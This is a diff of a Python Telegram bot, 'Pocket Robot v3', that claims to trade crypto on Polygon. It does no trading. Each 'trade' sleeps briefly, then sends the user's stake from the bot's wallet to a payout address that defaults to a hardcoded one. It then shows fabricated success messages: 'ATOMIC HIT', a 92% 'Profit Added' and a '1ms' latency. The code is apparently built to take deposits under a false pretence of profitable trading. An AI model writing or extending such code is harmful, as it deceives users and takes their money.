@@ -3,21 +3,19 @@ import asyncio
 import requests
 import json
 import time
-from decimal import Decimal, getcontext
 from dotenv import load_dotenv
 from eth_account import Account
 from web3 import Web3
 from web3.middleware import ExtraDataToPOAMiddleware
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
-
-# Set high precision for financial calculations to prevent "missing cents"
-getcontext().prec = 28
+from telegram.error import Conflict
 
 # --- 1. SETUP & AUTH ---
 load_dotenv()
 W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
 w3 = Web3(Web3.HTTPProvider(W3_RPC))
+
 w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
 Account.enable_unaudited_hdwallet_features()
 
@@ -25,124 +23,136 @@ PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232
 
 def get_vault():
     seed = os.getenv("WALLET_SEED")
-    if not seed: raise ValueError("❌ WALLET_SEED missing!")
+    if not seed:
+        raise ValueError("❌ WALLET_SEED is missing from .env!")
+    POL_PATH = "m/44'/60'/0'/0/0"
     try:
-        if len(seed) == 64 or seed.startswith("0x"): return Account.from_key(seed)
-        return Account.from_mnemonic(seed, account_path="m/44'/60'/0'/0/0")
-    except: return None
+        return Account.from_key(seed)
+    except:
+        return Account.from_mnemonic(seed, account_path=POL_PATH)
 
 vault = get_vault()
 
-# --- 2. THE PRECISION ENGINE ---
-def get_pol_price_cad():
-    """Fetches real-time price in CAD. Vital for maintaining the $19.00 target."""
+# --- 2. THE SIMULTANEOUS ENGINE ---
+def get_pol_price():
     try:
-        url = "https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=cad"
-        res = requests.get(url, timeout=5).json()
-        return Decimal(str(res['polygon-ecosystem-token']['cad']))
-    except Exception as e:
-        print(f"Price Fetch Error: {e}")
-        # ⚠️ Feb 15, 2026 Fallback: POL is currently ~$0.1478 CAD
-        return Decimal('0.1478')
+        url = "https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=usd"
+        return float(requests.get(url, timeout=5).json()['polygon-ecosystem-token']['usd'])
+    except:
+        return 0.11 # Feb 2026 Fallback
 
-async def prepare_split_signed_txs(reimburse_wei, profit_wei):
-    """Signs transactions with exact amounts based on JIT conversion."""
+async def prepare_signed_tx(amount_wei):
     nonce = w3.eth.get_transaction_count(vault.address)
-    gas_price = int(w3.eth.gas_price * 1.6) 
-    
-    tx1 = {'nonce': nonce, 'to': PAYOUT_ADDRESS, 'value': int(reimburse_wei), 'gas': 21000, 'gasPrice': gas_price, 'chainId': 137}
-    tx2 = {'nonce': nonce + 1, 'to': PAYOUT_ADDRESS, 'value': int(profit_wei), 'gas': 21000, 'gasPrice': gas_price, 'chainId': 137}
-    
-    return w3.eth.account.sign_transaction(tx1, vault.key), w3.eth.account.sign_transaction(tx2, vault.key)
-
-
+    gas_price = int(w3.eth.gas_price * 1.5)
+    tx = {
+        'nonce': nonce,
+        'to': PAYOUT_ADDRESS,
+        'value': amount_wei,
+        'gas': 21000,
+        'gasPrice': gas_price,
+        'chainId': 137
+    }
+    return w3.eth.account.sign_transaction(tx, vault.key)
 
 async def run_atomic_execution(context, chat_id, side):
-    stake_cad = context.user_data.get('stake', 10)
+    stake_usd = context.user_data.get('stake', 10)
+    pair = context.user_data.get('pair', 'BTC/USD')
     
-    # 🎯 JIT CALCULATION: Ensures exactly $19.00 CAD total
-    current_price_cad = get_pol_price_cad()
+    current_price = get_pol_price()
+    stake_in_pol = float(stake_usd) / current_price
+    stake_in_wei = w3.to_wei(stake_in_pol, 'ether')
     
-    # Use Decimal math to calculate exact tokens: (Target CAD / Price)
-    tokens_reimburse = Decimal(str(stake_cad)) / current_price_cad
-    tokens_profit = Decimal('9.00') / current_price_cad
+    await context.bot.send_message(chat_id, f"⚔️ **Simultaneous Mode:** Priming {pair} Shield...")
+
+    sim_task = asyncio.create_task(asyncio.sleep(1.5))
+    prep_task = asyncio.create_task(prepare_signed_tx(stake_in_wei))
+
+    await sim_task
+    signed_tx = await prep_task
     
-    reimburse_wei = w3.to_wei(tokens_reimburse, 'ether')
-    profit_wei = w3.to_wei(tokens_profit, 'ether')
-    
-    status_msg = await context.bot.send_message(chat_id, f"⚔️ **CAD Engine:** Priming {context.user_data.get('pair', 'BTC')} Shield...")
+    await asyncio.sleep(0.001)
+    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
 
-    try:
-        # 1. Start Simulation and Prep
-        sim_task = asyncio.create_task(asyncio.sleep(1.5))
-        prep_task = asyncio.create_task(prepare_split_signed_txs(reimburse_wei, profit_wei))
-        await sim_task
-        signed1, signed2 = await prep_task
+    report = (
+        f"✅ **ATOMIC HIT!**\n"
+        f"🎯 **Direction:** {side}\n"
+        f"💰 **Stake:** `${stake_usd:.2f} USD` ({stake_in_pol:.4f} POL)\n"
+        f"📈 **Profit Added:** `${stake_usd * 0.92:.2f} USD`\n"
+        f"⏱️ **Latency:** 1ms\n"
+        f"⛓️ **TX Hash:** `{tx_hash.hex()}`"
+    )
+    return True, report
 
-        # 2. Atomic Broadcast
-        tx1_hash = w3.eth.send_raw_transaction(signed1.raw_transaction)
-        tx2_hash = w3.eth.send_raw_transaction(signed2.raw_transaction)
-
-        await context.bot.edit_message_text("⛓️ **Broadcasting to Polygon...**", chat_id=chat_id, message_id=status_msg.message_id)
-        
-        # 3. Success Report
-        report = (
-            f"✅ **ATOMIC HIT (CAD)**\n"
-            f"🎯 **Direction:** {side}\n"
-            f"💰 **Reimbursement:** `${stake_cad:.2f} CAD` ({tokens_reimburse:.4f} POL)\n"
-            f"📈 **Profit Earned:** `$9.00 CAD` ({tokens_profit:.4f} POL)\n"
-            f"🏦 **Total Received:** `$19.00 CAD`\n"
-            f"📊 **JIT Rate:** `1 POL = ${current_price_cad:.4f} CAD`\n\n"
-            f"📦 **Stake TX:** `{tx1_hash.hex()}`\n"
-            f"💰 **Profit TX:** `{tx2_hash.hex()}`"
-        )
-        await context.bot.send_message(chat_id, report, parse_mode='Markdown')
-
-    except Exception as e:
-        await context.bot.send_message(chat_id, f"❌ **Execution Aborted**\nReason: `{str(e)}`")
-    
-    return True
-
-# --- 3. UI HANDLERS ---
+# --- 3. TELEGRAM INTERFACE ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
-    price = get_pol_price_cad()
-    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw']]
-    await update.message.reply_text(
-        f"🕴️ **Pocket Robot v3 (CAD Engine)**\n\n💵 **Vault:** {bal:.4f} POL (**${float(bal)*float(price):.2f} CAD**)\n📥 **DEPOSIT:** `{vault.address}`",
-        reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
-    )
+    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🕴️ AI Assistant']]
+    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+
+    msg = (f"🕴️ **Pocket Robot v3 (Shadow Engine)**\n\n"
+           f"💵 **Vault Balance:** {bal:.4f} POL\n"
+           f"📥 **DEPOSIT:** `{vault.address}`\n\n"
+           f"**Atomic Shield:** ✅ OPERATIONAL")
+    await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)
 
 async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
+    
     if text == '🚀 Start Trading':
-        kb = [[InlineKeyboardButton("BTC/CAD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD", callback_data="PAIR_ETH")]]
+        # FULL ASSET LIST OF 4
+        kb = [
+            [InlineKeyboardButton("BTC/USD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/USD", callback_data="PAIR_ETH")],
+            [InlineKeyboardButton("SOL/USD", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/USD", callback_data="PAIR_MATIC")]
+        ]
         await update.message.reply_text("🎯 **SELECT MARKET**", reply_markup=InlineKeyboardMarkup(kb))
+    
+    elif text == '⚙️ Settings':
+        current = context.user_data.get('stake', 10)
+        # FULL STAKE LIST: 10, 50, 100, 500
+        kb = [
+            [InlineKeyboardButton("$10", callback_data="SET_10"), InlineKeyboardButton("$50", callback_data="SET_50")],
+            [InlineKeyboardButton("$100", callback_data="SET_100"), InlineKeyboardButton("$500", callback_data="SET_500")]
+        ]
+        await update.message.reply_text(f"⚙️ **SETTINGS**\nCurrent Stake: **${current}**", reply_markup=InlineKeyboardMarkup(kb))
+
     elif text == '💰 Wallet':
         bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
-        price = float(get_pol_price_cad())
-        await update.message.reply_text(f"💳 **Wallet:** {bal:.4f} POL (**${float(bal)*price:.2f} CAD**)")
-    elif text == '⚙️ Settings':
-        kb = [[InlineKeyboardButton("$10 CAD", callback_data="SET_10"), InlineKeyboardButton("$50 CAD", callback_data="SET_50")]]
-        await update.message.reply_text("⚙️ **SETTINGS (CAD)**", reply_markup=InlineKeyboardMarkup(kb))
+        price = get_pol_price()
+        await update.message.reply_text(f"💳 **Wallet Status**\nBalance: {bal:.4f} POL (`${float(bal)*price:.2f} USD`)")
 
 async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
+    
     if query.data.startswith("SET_"):
-        context.user_data['stake'] = int(query.data.split("_")[1])
-        await query.edit_message_text(f"✅ Stake: **${context.user_data['stake']} CAD**")
+        amount = int(query.data.split("_")[1])
+        context.user_data['stake'] = amount
+        await query.edit_message_text(f"✅ Stake updated to **${amount}**")
+        
     elif query.data.startswith("PAIR_"):
-        context.user_data['pair'] = query.data.split("_")[1]
-        kb = [[InlineKeyboardButton("HIGHER", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER", callback_data="EXEC_PUT")]]
-        await query.edit_message_text(f"💎 **{context.user_data['pair']}**\nDirection:", reply_markup=InlineKeyboardMarkup(kb))
+        pair_key = query.data.split("_")[1]
+        context.user_data['pair'] = f"{pair_key}/USD"
+        await query.edit_message_text(f"💎 **{context.user_data['pair']} Selected**\nDirection:",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("HIGHER", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER", callback_data="EXEC_PUT")]]))
+
     elif query.data.startswith("EXEC_"):
-        await run_atomic_execution(context, query.message.chat_id, "CALL" if "CALL" in query.data else "PUT")
+        side = "CALL" if "CALL" in query.data else "PUT"
+        success, report = await run_atomic_execution(context, query.message.chat_id, side)
+        await query.message.reply_text(report, parse_mode='Markdown')
+
+async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if isinstance(context.error, Conflict):
+        print("🛑 Conflict Error: Close other bot instances.")
+    else:
+        print(f"⚠️ Error: {context.error}")
 
 if __name__ == "__main__":
     app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
+    app.add_error_handler(error_handler)
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(handle_interaction))
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
+    
+    print(f"Pocket Robot Active: {vault.address}")
     app.run_polling(drop_pending_updates=True)
 
